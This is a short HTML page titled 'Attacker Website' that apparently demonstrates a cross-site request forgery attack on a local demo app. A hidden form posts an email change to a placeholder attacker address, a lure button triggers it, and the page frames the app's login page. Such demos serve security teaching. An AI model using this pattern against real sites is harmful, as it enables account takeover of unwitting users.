<!DOCTYPE html>
<html>
  <head>
    <title>Attacker Website</title>
    <script>
      function submitForm() {
        const form = document.getElementById("csrf-form");
        form.submit();
      }
    </script>
  </head>
  <body>
    <h1>Attacker Website</h1>
    <form
      id="csrf-form"
      action="http://localhost:3000/change-email"
      method="post"
      style="display: none"
    >
      <input type="email" name="email" value="attacker@example.com" />
    </form>
    <button onclick="submitForm()">Click me for a surprise</button>

    <iframe
      src="http://localhost:3000/login"
      frameborder="0"
      style="width: 100%; height: 100vh"
    ></iframe>
  </body>
</html>
